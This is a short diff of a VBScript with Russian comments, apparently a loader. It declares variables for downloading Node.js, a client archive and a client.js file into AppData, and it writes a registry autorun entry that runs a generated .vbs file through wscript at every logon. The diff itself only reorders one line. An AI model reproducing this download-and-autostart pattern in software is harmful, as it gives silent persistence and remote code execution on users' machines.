@@ -1,12 +1,10 @@
+Option Explicit
 ' === Объявляем ВСЕ переменные сразу ===
 Dim objShell, objFSO, objHTTP
 Dim appData, nodeDir, nodeZip, clientZip, nodeExe, clientJs
 Dim nodeZipUrl, clientZipUrl, clientJsUrl, regPath
 Dim configUrl, dict, lines, line, key, value
 Dim i, success, vbsFile, f
-
-Option Explicit
-
 ' === Создаём объекты ===
 Set objShell = CreateObject("Wscript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
@@ -92,4 +90,5 @@ f.Close
 
 ' === Добавляем ключ автозапуска ===
 objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
+
 
